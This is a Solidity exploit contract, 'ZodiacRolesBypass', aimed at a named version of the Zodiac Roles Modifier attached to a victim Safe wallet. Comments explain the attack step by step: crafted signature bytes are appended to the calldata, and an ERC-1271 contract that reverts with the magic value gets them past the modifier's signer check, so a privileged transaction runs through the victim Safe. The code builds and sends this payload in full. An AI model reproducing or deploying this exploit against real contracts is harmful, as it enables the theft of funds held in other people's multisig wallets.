// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/**
 * @title ZodiacRolesBypass
 * @notice Drives the ERC-1271 revert-magic bypass against a vulnerable
 *         Zodiac Roles Modifier (v2.1.0) that sits on a victim Safe.
 *
 * @dev Attack outline
 *   1. The Roles modifier is enabled as a module on the victim Safe, and a
 *      privileged Safe (with ExtensibleFallbackHandler) is enabled as a
 *      module/role member on the Roles modifier.
 *   2. We call `execTransactionWithRole` (NOT execTransactionFromModule:
 *      that one reads defaultRoles[msg.sender] which is zero for us) with
 *      the victim Safe's roleKey, and append crafted signature material to
 *      the calldata. Solidity's ABI decoder ignores the trailing bytes,
 *      but `moduleTxSignedBy()` parses them.
 *
 *   Appended calldata layout (parsed by moduleTxSignedBy):
 *
 *     [ normal ABI call: execTransactionWithRole(...)        ]  <- data[:start]
 *     [ innerSig: Safe contract-signature blob for magic c.  ]  <- data[start:end]
 *     [ salt (32)                                            ]
 *     [ r = safeSigner (32)                                  ]
 *     [ s = start offset (32)                                ]
 *     [ v = 0x00 (1)  -> contract-signature path             ]
 *
 *   3. moduleOnly() -> moduleTxSignedBy() -> v == 0 -> signer = safeSigner
 *      -> _isValidContractSignature(safeSigner, hash, innerSig)
 *      -> Safe (fallback handler) -> checkSignatures
 *      -> entry 0 is a contract signature pointing at RevertMagic1271
 *      -> it reverts with 0x1626ba7e -> the revert data propagates back to
 *      the Roles modifier, which ignores the failure and accepts the Safe
 *      as the valid signer.
 *   4. _authorize() then checks role.members[safeSigner] (true) and the
 *      role's permissions for the smuggled call, and finally executes it
 *      through the victim Safe via target.execTransactionFromModule().
 */
contract ZodiacRolesBypass {
    bytes4 private constant EXEC_WITH_ROLE =
        bytes4(
            keccak256(
                "execTransactionWithRole(address,uint256,bytes,uint8,bytes32,bool)"
            )
        );

    /**
     * @param roles        vulnerable Roles modifier (v2.1.0)
     * @param safeSigner   enabled module / role member: the Safe whose
     *                     ExtensibleFallbackHandler answers isValidSignature
     * @param magic        deployed RevertMagic1271 contract
     * @param roleKey      a role that `safeSigner` is a member of
     * @param safeThreshold threshold() of `safeSigner` (drives inner padding)
     * @param to,value,data,operation  the privileged call to smuggle through
     * @param salt         fresh salt (anti-replay in ExecutionTracker)
     */
    function exploit(
        address roles,
        address safeSigner,
        address magic,
        bytes32 roleKey,
        uint256 safeThreshold,
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        bytes32 salt
    ) external returns (bool) {
        // ------------------------------------------------------------------
        // Build innerSig: ONE Safe "contract signature" (v == 0) for the
        // magic contract, followed by a padding region whose purpose is:
        //   (a) satisfy `require(signatures.length >= threshold * 65, "GS021")`
        //   (b) provide a valid target for the inner `s` offset below
        //
        // Safe signature buffer layout (v1.3.0):
        //
        //   [ r (32) | s (32) | v (1) ]                    <- 65-byte entry
        //   [ dynamic length (32) ]                        <- N
        //   [ dynamic data  (N bytes) ]                    <- payload
        //
        //   For contract signatures (v == 0):
        //     • r = the signer contract (magic)
        //     • s = byte-offset inside the buffer where the dynamic part
        //           of THIS signature begins
        //
        //   Safe's own checkSignatures does:
        //     require(signatures.length >= threshold * 65, "GS021")
        //     then for entry i:
        //        r = buffer[i*65 : i*65+32]
        //        s = buffer[i*65+32 : i*65+64]
        //        v = buffer[i*65+64]
        //        if v == 0:
        //           contractSignatureLen := mload(buffer + s + 32)
        //           // call signer.isValidSignature(hash, buffer[s+32 : s+32+len])
        //
        //   Critically: Safe enforces  s >= threshold * 65  via GS021 on
        //   the FIRST iteration check, i.e. the `s` we write must be at
        //   least threshold * 65 and point to a valid length word inside
        //   our own buffer.
        // ------------------------------------------------------------------

        uint256 threshold65 = safeThreshold * 65;   // e.g. 5*65 = 325
        uint256 dynamicOffset = threshold65;        // where the "length" word lives
        uint256 dynamicDataLen = 0;                 // empty payload for the magic call

        // Total innerSig length: entry (65) + gap up to dynamicOffset +
        // length word (32) + dynamic data (0)
        uint256 innerSigLen = dynamicOffset + 32 + dynamicDataLen;

        bytes memory innerSig = new bytes(innerSigLen);

        // ---- write entry 0 ----
        // r = magic contract (left-padded 20-byte address into 32 bytes)
        bytes32 r = bytes32(uint256(uint160(magic)));
        // s = dynamicOffset (where the length word of the dynamic part sits)
        bytes32 s = bytes32(dynamicOffset);
        // v = 0x00 (contract signature marker)
        uint8 v = 0;

        assembly {
            let ptr := add(innerSig, 32) // skip length word of `bytes`
            mstore(ptr, r)                          // bytes 0..31
            mstore(add(ptr, 32), s)                 // bytes 32..63
            mstore8(add(ptr, 64), v)                // byte 64
            // the "length word" of the dynamic part lives at ptr + dynamicOffset
            mstore(add(ptr, dynamicOffset), dynamicDataLen)
            // dynamic data region is empty
        }

        // ------------------------------------------------------------------
        // Outer call: normal ABI call + appended signature material.
        // The trailing block MUST satisfy moduleTxSignedBy():
        //
        //   last byte          = v  (= 0 -> contract signature)
        //   bytes[-65 .. -33]  = r  (= safeSigner)
        //   bytes[-33 .. -1]   = s  (= payload.length, i.e. where data[]
        //                            representing the "signed message" starts)
        //   bytes[-97 .. -65]  = salt (32)
        //   everything before that (from data[s:data.length-97]) = innerSig
        //
        // So we place: [ innerSig ][ salt ][ r ][ s ][ v ]
        // and set s = payload.length.
        // ------------------------------------------------------------------
        bytes memory payload = abi.encodeWithSelector(
            EXEC_WITH_ROLE,
            to,
            value,
            data,
            operation,
            roleKey,
            true // shouldRevert: propagate inner failure
        );

        bytes memory trailing = abi.encodePacked(
            innerSig,                                 // data[s:end] -> Safe._signature
            salt,                                     // 32-byte salt
            bytes32(uint256(uint160(safeSigner))),    // r
            bytes32(payload.length),                  // s = start offset
            bytes(hex"00")                            // v = 0 -> contract signature path
        );

        (bool ok, bytes memory returndata) = roles.call(
            abi.encodePacked(payload, trailing)
        );
        if (!ok) {
            // bubble up the revert reason
            assembly {
                revert(add(returndata, 0x20), mload(returndata))
            }
        }
        return ok;
    }
}
